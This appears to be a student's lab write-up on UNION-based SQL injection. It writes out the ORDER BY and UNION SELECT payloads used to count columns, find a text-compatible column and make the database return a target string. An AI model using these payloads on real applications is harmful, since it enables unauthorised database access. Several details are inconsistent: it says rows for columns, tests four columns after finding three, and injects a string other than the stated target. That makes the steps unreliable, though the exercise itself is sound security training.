Make the database retrieve the string: 'EUOXzb'
1. The first step in this lab is to find out the number of columns you can do this one of two ways:
		a. when solving for union based sql injection find number of rows by:
		' ORDER BY 1--
		b. ' UNION SELECT NULL, NULL--
By doing this I found that there is a total of 3 rows.
![[Pasted image 20211201102036.png]]

Now I realized that I have to find a column with a useful data type in a sql injection. 
So to do this I have submitted string data on union select payloads that place a string value into each column.
If the data type isn't compatible the db should return an error or exception

' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--

I used this query to determine that the expected input is a string:
' UNION SELECT NULL,'a',NULL-- 

I then searched for the required string using:
' UNION SELECT NULL,'VqGnBB',NULL-- 

